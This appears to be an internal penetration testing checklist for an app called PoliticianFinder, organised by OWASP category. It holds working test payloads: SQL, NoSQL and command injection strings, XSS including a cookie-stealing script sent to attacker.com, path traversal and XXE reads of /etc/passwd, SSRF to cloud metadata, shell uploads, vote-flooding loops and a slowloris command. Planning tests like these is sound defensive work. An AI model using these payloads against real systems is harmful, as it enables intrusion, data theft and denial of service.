# Penetration Testing Checklist

## Overview
Comprehensive security testing checklist for PoliticianFinder application based on OWASP Top 10 and industry best practices.

## Pre-Testing Setup

### Test Environment
- [ ] Use staging environment (not production)
- [ ] Create test accounts with various permission levels
- [ ] Backup database before testing
- [ ] Document all test activities
- [ ] Obtain authorization for testing

### Testing Tools
- [ ] Burp Suite (Web Application Security)
- [ ] OWASP ZAP (Automated Scanner)
- [ ] SQLMap (SQL Injection)
- [ ] XSStrike (XSS Detection)
- [ ] Nikto (Web Server Scanner)
- [ ] Nmap (Port Scanner)
- [ ] Postman (API Testing)
- [ ] Browser DevTools

## 1. Authentication & Authorization

### A1.1 Authentication Testing
- [ ] Test weak password acceptance
- [ ] Verify password complexity requirements
- [ ] Test account lockout mechanism
- [ ] Check for default credentials
- [ ] Test password reset functionality
- [ ] Verify MFA implementation
- [ ] Test session timeout
- [ ] Check for brute force protection
- [ ] Verify logout functionality
- [ ] Test "Remember Me" security

**Test Cases:**
```bash
# Brute force test
# Should be blocked after 5 attempts
curl -X POST https://site/api/auth/login \
  -d '{"email":"test@test.com","password":"wrong1"}'
# Repeat 10 times

# SQL injection in login
curl -X POST https://site/api/auth/login \
  -d '{"email":"admin'\'' OR 1=1--","password":"any"}'
# Should be sanitized
```

### A1.2 Authorization Testing
- [ ] Test horizontal privilege escalation
- [ ] Test vertical privilege escalation
- [ ] Verify role-based access control
- [ ] Test direct object references
- [ ] Check API endpoint authorization
- [ ] Verify file access permissions
- [ ] Test admin panel access
- [ ] Check for forced browsing vulnerabilities

**Test Cases:**
```bash
# Access another user's profile
curl -H "Authorization: Bearer USER_A_TOKEN" \
  https://site/api/users/USER_B_ID

# Access admin endpoint as regular user
curl -H "Authorization: Bearer USER_TOKEN" \
  https://site/api/admin/beta-invites
```

## 2. Injection Vulnerabilities

### A2.1 SQL Injection
- [ ] Test login forms
- [ ] Test search functionality
- [ ] Test filter parameters
- [ ] Test sorting parameters
- [ ] Test API endpoints
- [ ] Verify prepared statements usage
- [ ] Check ORM implementation
- [ ] Test time-based blind SQLi

**Test Payloads:**
```sql
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
admin' #
' UNION SELECT NULL--
' AND 1=1--
' AND 1=2--
```

### A2.2 NoSQL Injection
- [ ] Test MongoDB queries
- [ ] Test JSON input fields
- [ ] Verify input sanitization

**Test Payloads:**
```json
{"email": {"$ne": null}, "password": {"$ne": null}}
{"email": {"$gt": ""}, "password": {"$gt": ""}}
```

### A2.3 Command Injection
- [ ] Test file upload features
- [ ] Test image processing
- [ ] Test any system command execution
- [ ] Verify input sanitization

**Test Payloads:**
```bash
; ls -la
| whoami
& dir
`id`
$(whoami)
```

### A2.4 LDAP Injection
- [ ] Test if LDAP is used
- [ ] Test user lookup functionality

### A2.5 XPath Injection
- [ ] Test XML parsing
- [ ] Test XML-based queries

## 3. Cross-Site Scripting (XSS)

### A3.1 Reflected XSS
- [ ] Test search functionality
- [ ] Test error messages
- [ ] Test URL parameters
- [ ] Test form inputs

**Test Payloads:**
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
```

### A3.2 Stored XSS
- [ ] Test comment system
- [ ] Test rating reviews
- [ ] Test profile bio
- [ ] Test politician descriptions
- [ ] Test any user-generated content

**Test Cases:**
```javascript
// Post comment with XSS
POST /api/comments
{
  "content": "<script>document.location='http://attacker.com?cookie='+document.cookie</script>"
}
// Should be sanitized
```

### A3.3 DOM-based XSS
- [ ] Test client-side routing
- [ ] Test dynamic content rendering
- [ ] Review JavaScript code

## 4. Broken Access Control

### A4.1 Insecure Direct Object References
- [ ] Test user ID manipulation
- [ ] Test politician ID manipulation
- [ ] Test bookmark ID manipulation
- [ ] Test comment ID manipulation

**Test Cases:**
```bash
# Try accessing other user's bookmarks
GET /api/users/123/bookmarks
# With user 456's token

# Try modifying other user's rating
PUT /api/ratings/789
# That belongs to another user
```

### A4.2 Missing Function Level Access Control
- [ ] Test admin functions as user
- [ ] Test moderator functions as user
- [ ] Test beta invite endpoints

### A4.3 Path Traversal
- [ ] Test file download features
- [ ] Test image upload paths
- [ ] Test API file access

**Test Payloads:**
```
../../etc/passwd
..\..\windows\system32\config\sam
....//....//etc/passwd
```

## 5. Security Misconfiguration

### A5.1 Server Configuration
- [ ] Check for directory listing
- [ ] Verify error page information disclosure
- [ ] Test for exposed .git folder
- [ ] Check for exposed .env files
- [ ] Verify security headers
- [ ] Test CORS configuration
- [ ] Check for debug mode enabled

**Test Cases:**
```bash
# Check for exposed files
curl https://site/.git/config
curl https://site/.env
curl https://site/package.json

# Check security headers
curl -I https://site/
# Verify: HSTS, CSP, X-Frame-Options, etc.

# Test CORS
curl -H "Origin: http://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -X OPTIONS https://site/api/auth/login
```

### A5.2 Default Configurations
- [ ] Check for default passwords
- [ ] Verify no test accounts in production
- [ ] Check for sample files
- [ ] Verify API keys rotated

### A5.3 Verbose Error Messages
- [ ] Test invalid inputs
- [ ] Check stack traces in responses
- [ ] Verify error handling

## 6. Sensitive Data Exposure

### A6.1 Data in Transit
- [ ] Verify HTTPS everywhere
- [ ] Check TLS version (1.2+)
- [ ] Test mixed content
- [ ] Verify secure cookies
- [ ] Check for sensitive data in URLs

**Test Cases:**
```bash
# Check TLS version
nmap --script ssl-enum-ciphers -p 443 site.com

# Check for weak ciphers
sslscan site.com

# Verify secure cookies
curl -I https://site/
# Check Set-Cookie: Secure; HttpOnly; SameSite
```

### A6.2 Data at Rest
- [ ] Verify password hashing (bcrypt/argon2)
- [ ] Check for encrypted sensitive fields
- [ ] Verify no passwords in logs
- [ ] Check database encryption

### A6.3 Sensitive Information in Responses
- [ ] Check API responses for excess data
- [ ] Verify no credentials in responses
- [ ] Test for user enumeration

**Test Cases:**
```bash
# User enumeration via login
POST /api/auth/login
{"email":"exists@test.com","password":"wrong"}
# Response: "Invalid password"

POST /api/auth/login
{"email":"notexist@test.com","password":"wrong"}
# Response: "Invalid password" (same message = good)
```

## 7. Cross-Site Request Forgery (CSRF)

### A7.1 CSRF Testing
- [ ] Test state-changing operations
- [ ] Verify CSRF tokens present
- [ ] Test token validation
- [ ] Check SameSite cookie attribute
- [ ] Test token in headers vs body

**Test Cases:**
```html
<!-- CSRF attempt -->
<form action="https://site/api/ratings" method="POST">
  <input name="rating" value="5" />
  <input name="comment" value="Hacked!" />
</form>
<script>document.forms[0].submit();</script>
```

### A7.2 CORS Misconfiguration
- [ ] Test wildcard origins
- [ ] Verify credentials handling
- [ ] Test null origin

## 8. Server-Side Request Forgery (SSRF)

### A8.1 SSRF Testing
- [ ] Test URL input fields
- [ ] Test webhook functionality
- [ ] Test image/file imports
- [ ] Verify URL validation

**Test Payloads:**
```
http://localhost:3000/api/admin
http://127.0.0.1:22
http://169.254.169.254/latest/meta-data/
file:///etc/passwd
```

## 9. File Upload Vulnerabilities

### A9.1 File Upload Testing
- [ ] Test file type validation
- [ ] Test file size limits
- [ ] Test malicious file uploads
- [ ] Verify file name sanitization
- [ ] Check for arbitrary file execution
- [ ] Test image processing vulnerabilities

**Test Cases:**
```bash
# Upload executable as image
curl -F "file=@malicious.php.jpg" \
  https://site/api/upload

# Upload oversized file
dd if=/dev/zero of=large.jpg bs=1M count=100
curl -F "file=@large.jpg" https://site/api/upload

# Test double extension
curl -F "file=@shell.php.jpg" https://site/api/upload
```

## 10. API Security

### A10.1 API Authentication
- [ ] Test API without tokens
- [ ] Test expired tokens
- [ ] Test token reuse
- [ ] Verify token expiration
- [ ] Test API key security

### A10.2 Rate Limiting
- [ ] Test API rate limits
- [ ] Verify 429 responses
- [ ] Test bypass methods
- [ ] Check different endpoints

**Test Cases:**
```bash
# Rapid requests to test rate limiting
for i in {1..100}; do
  curl https://site/api/politicians &
done
# Should return 429 after threshold
```

### A10.3 Input Validation
- [ ] Test oversized payloads
- [ ] Test malformed JSON
- [ ] Test type confusion
- [ ] Test boundary values

**Test Payloads:**
```json
// Oversized payload
{"comment": "A".repeat(100000)}

// Type confusion
{"rating": "five"}
{"rating": -1}
{"rating": 999}

// Null/undefined
{"rating": null}
{"comment": undefined}
```

## 11. Business Logic Vulnerabilities

### A11.1 Logic Flaws
- [ ] Test negative values
- [ ] Test duplicate submissions
- [ ] Test race conditions
- [ ] Test workflow bypass
- [ ] Test parameter tampering

**Test Cases:**
```bash
# Race condition - double bookmark
curl -X POST https://site/api/bookmarks/123 &
curl -X POST https://site/api/bookmarks/123 &

# Negative rating
curl -X POST https://site/api/ratings \
  -d '{"rating": -5, "politician_id": 123}'

# Vote manipulation
for i in {1..1000}; do
  curl -X POST https://site/api/ratings \
    -d '{"rating": 5, "politician_id": 123}'
done
```

### A11.2 Application Flow
- [ ] Test registration bypass
- [ ] Test payment bypass (if applicable)
- [ ] Test workflow order
- [ ] Test beta invite bypass

## 12. Client-Side Security

### A12.1 JavaScript Security
- [ ] Review client-side validation
- [ ] Check for secrets in JS
- [ ] Test source map exposure
- [ ] Verify obfuscation

**Test Cases:**
```bash
# Check for exposed secrets
curl https://site/_next/static/chunks/main.js | grep -i "api_key\|secret\|password"

# Check source maps
curl https://site/_next/static/chunks/main.js.map
```

### A12.2 Local Storage Security
- [ ] Check for sensitive data in localStorage
- [ ] Verify token storage security
- [ ] Test XSS access to storage

## 13. Mobile API Security

### A13.1 Mobile-Specific Tests
- [ ] Test API versioning
- [ ] Verify certificate pinning
- [ ] Test mobile-specific endpoints
- [ ] Check for hardcoded secrets

## 14. Advanced Attacks

### A14.1 XML External Entity (XXE)
- [ ] Test XML parsing
- [ ] Test SVG upload
- [ ] Verify XML parser configuration

**Test Payloads:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### A14.2 Server-Side Template Injection
- [ ] Test template rendering
- [ ] Test dynamic content generation

**Test Payloads:**
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
```

### A14.3 Deserialization Vulnerabilities
- [ ] Test object deserialization
- [ ] Check for unsafe deserialization

### A14.4 Clickjacking
- [ ] Test X-Frame-Options header
- [ ] Verify CSP frame-ancestors
- [ ] Test iframe embedding

**Test Case:**
```html
<iframe src="https://site/login"></iframe>
<!-- Should be blocked by X-Frame-Options: DENY -->
```

## 15. Infrastructure Security

### A15.1 Network Security
- [ ] Scan open ports
- [ ] Test firewall rules
- [ ] Verify VPN/bastion access
- [ ] Check for unnecessary services

**Test Cases:**
```bash
# Port scan
nmap -sV -p- site.com

# Service enumeration
nmap -sV -sC site.com
```

### A15.2 SSL/TLS Security
- [ ] Test SSL Labs rating
- [ ] Verify certificate validity
- [ ] Check for weak ciphers
- [ ] Test HSTS implementation

```bash
# SSL/TLS test
testssl.sh site.com
```

## 16. Denial of Service (DoS)

### A16.1 Application-Level DoS
- [ ] Test resource exhaustion
- [ ] Test regex DoS (ReDoS)
- [ ] Test algorithmic complexity
- [ ] Verify timeout configurations

**Test Cases:**
```bash
# Large pagination request
curl "https://site/api/politicians?limit=999999"

# ReDoS payload
curl "https://site/api/search?q=(a+)+"

# Slowloris attack (for testing only)
slowloris site.com
```

## 17. Third-Party Integration Security

### A17.1 OAuth Security
- [ ] Test redirect_uri validation
- [ ] Verify state parameter
- [ ] Test token leakage
- [ ] Check scope validation

### A17.2 External API Security
- [ ] Test Supabase security
- [ ] Verify Upstash security
- [ ] Check email service security
- [ ] Test analytics security

## Testing Report Template

### Executive Summary
- Testing period: [dates]
- Tester: [name]
- Scope: [what was tested]
- Critical findings: [count]
- High findings: [count]
- Medium findings: [count]
- Low findings: [count]

### Findings

#### Finding #1: [Title]
- **Severity:** Critical/High/Medium/Low
- **Location:** [URL/endpoint]
- **Description:** [Detailed description]
- **Impact:** [Security impact]
- **Reproduction Steps:**
  1. Step 1
  2. Step 2
  3. Step 3
- **Evidence:** [Screenshots/logs]
- **Recommendation:** [How to fix]
- **Status:** Open/Fixed/Accepted Risk

### Risk Rating Matrix
| Likelihood | Impact | Risk Level |
|------------|--------|------------|
| High | High | Critical |
| High | Medium | High |
| Medium | High | High |
| Medium | Medium | Medium |
| Low | Medium | Low |

## Post-Testing Actions

### Immediate Actions (Critical/High)
- [ ] Patch critical vulnerabilities
- [ ] Deploy hotfixes
- [ ] Notify stakeholders
- [ ] Monitor for exploitation

### Short-term Actions (Medium)
- [ ] Plan fixes in next sprint
- [ ] Update security guidelines
- [ ] Review similar code

### Long-term Actions (Low)
- [ ] Add to backlog
- [ ] Implement in future releases
- [ ] Update documentation

## Compliance Checklist

### OWASP Top 10 2021
- [ ] A01:2021 – Broken Access Control
- [ ] A02:2021 – Cryptographic Failures
- [ ] A03:2021 – Injection
- [ ] A04:2021 – Insecure Design
- [ ] A05:2021 – Security Misconfiguration
- [ ] A06:2021 – Vulnerable Components
- [ ] A07:2021 – Authentication Failures
- [ ] A08:2021 – Software and Data Integrity
- [ ] A09:2021 – Security Logging Failures
- [ ] A10:2021 – Server-Side Request Forgery

### Security Standards
- [ ] OWASP ASVS compliance
- [ ] PCI DSS (if applicable)
- [ ] GDPR compliance
- [ ] ISO 27001 alignment

## Automated Scanning

### Setup Automated Scans
```bash
# OWASP ZAP automated scan
zap-cli quick-scan -s xss,sqli https://site.com

# Nikto scan
nikto -h https://site.com

# Dependency check
npm audit
npx snyk test
```

### Continuous Security Testing
```yaml
# .github/workflows/security.yml
name: Security Scan
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: Run npm audit
        run: npm audit
      - name: Run OWASP Dependency Check
        run: dependency-check --scan . --format HTML
```

---

**Document Version:** 1.0
**Last Updated:** 2025-10-18
**Next Review:** Quarterly or before major releases
**Classification:** Confidential - Internal Use Only
